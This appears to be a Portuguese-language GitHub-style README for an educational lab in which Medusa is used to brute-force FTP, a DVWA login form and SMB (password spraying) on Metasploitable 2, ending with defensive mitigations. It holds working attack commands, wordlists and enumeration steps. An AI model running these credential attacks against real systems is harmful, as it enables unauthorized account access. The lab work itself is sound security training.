🔐 Projeto: Testes de Força Bruta com Medusa em Ambiente Controlado

Este projeto demonstra a implementação, execução e documentação de testes ofensivos utilizando **Kali Linux**, **Medusa**, **Metasploitable 2** e **DVWA**, focado no aprendizado seguro e ético de técnicas de força bruta, password spraying e automação de tentativas de login.

---

## 📌 Objetivos do Projeto

* Configurar um ambiente isolado de laboratório utilizando VirtualBox.
* Executar ataques simulados com Medusa em diferentes serviços vulneráveis.
* Documentar wordlists, comandos e validações práticas.
* Refletir sobre medidas defensivas (Blue Team) aplicáveis ao mundo real.

---

## 🖥️ Arquitetura do Ambiente

### Máquinas Virtuais (VirtualBox):

* **Kali Linux** — Máquina atacante
* **Metasploitable 2** — Serviço vulnerável alvo
* **DVWA** — Aplicação web vulnerável (pode rodar na Metasploitable)

### Rede:

* Configuração: **Host-Only Adapter**
* Motivo: Isolamento total, garante segurança e controle

---

## ⚙️ Configuração Inicial

Verifique a comunicação entre as VMs:

```bash
ping 192.168.56.102   # IP da Metasploitable
```

---

# 🚨 Testes Realizados

---

# 1️⃣ Força Bruta em FTP (vsftpd – Metasploitable)

### Wordlist simples:

```bash
echo "123456" > wordlist.txt
echo "msfadmin" >> wordlist.txt
echo "password" >> wordlist.txt
```

### Ataque com Medusa:

```bash
medusa -h 192.168.56.102 -u msfadmin -P wordlist.txt -M ftp
```

### Resultado esperado:

```
ACCOUNT FOUND: [ftp] Host: 192.168.56.102 User: msfadmin Password: msfadmin
```

---

# 2️⃣ Automação de Login – DVWA (Formulário Web)

### Wordlist:

```bash
echo "123" > pass.txt
echo "password" >> pass.txt
echo "admin" >> pass.txt
```

### Identificação do formulário:

* URL: `/dvwa/login.php`
* Parâmetros:

  * `username`
  * `password`
  * `Login`
* Indicador de falha: **"Login failed"**

### Ataque:

```bash
medusa -h 192.168.56.102 -u admin -P pass.txt -M http \
-m FORM:"/dvwa/login.php":"username=^USER^&password=^PASS^&Login=Login":"Login failed"
```

---

# 3️⃣ Password Spraying em SMB

### Enumeração de usuários:

```bash
enum4linux -U 192.168.56.102 | grep "user:"
```

### Wordlists:

```bash
echo -e "msfadmin\nuser\nservice\npostgres" > users.txt
echo "password" > onepass.txt
```

### Ataque:

```bash
medusa -h 192.168.56.102 -U users.txt -p password -M smbnt
```

---

# ✔️ Validação dos Acessos

### FTP:

```bash
ftp 192.168.56.102
```

### DVWA:

Login via interface web.

### SMB:

```bash
smbclient -L 192.168.56.102 -U msfadmin
```

---

# 🛡️ Mitigações Recomendadas (Blue Team)

* Políticas de senha fortes e complexas
* Autenticação multifator (MFA)
* Rate limiting e bloqueio após tentativas consecutivas
* Captcha em formulários de login
* Monitoramento e correlação de logs em SIEM
* Desativar serviços legados (ex.: FTP → SFTP)
* Configuração de mensagens de erro genéricas

---

# 📚 Conclusões

Este projeto proporcionou:

* Entendimento real de como ferramentas de brute force operam.
* Visão ofensiva útil para construção de defesas mais robustas.
* Compreensão prática sobre enumeração, validação e mitigação.
* Fortalecimento de habilidades essenciais de **Blue Team e Red Team**.


